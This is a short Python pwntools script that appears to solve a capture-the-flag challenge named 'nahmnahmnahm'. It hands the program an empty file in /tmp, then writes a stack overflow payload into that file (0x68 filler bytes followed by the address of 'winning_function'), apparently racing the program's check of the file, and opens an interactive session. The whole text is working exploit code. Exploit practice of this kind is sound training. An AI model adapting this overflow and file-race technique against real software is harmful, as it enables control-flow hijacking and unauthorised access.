from pwn import *
import os

context.binary = elf = ELF('./nahmnahmnahm')

# Open the file in binary write mode
file = open("/tmp/payload", "wb")
file.write(b'')

p = process('./nahmnahmnahm', level="CRITICAL")
#gdb.attach(p, api=True)
p.recvuntil(b'file: ')
p.sendline(b'/tmp/payload')
res = p.recvline()
print(res)
if b'enter' in res:
    # Create a byte object
    payload = b'A'*0x68 + p64(elf.sym['winning_function'])  # Example byte data
    # Write the byte data to the file
    file.write(payload)
    file.close()
    time.sleep(1)
    os.system('cat /tmp/payload')
    p.sendline(b'a')
    p.interactive()
p.close()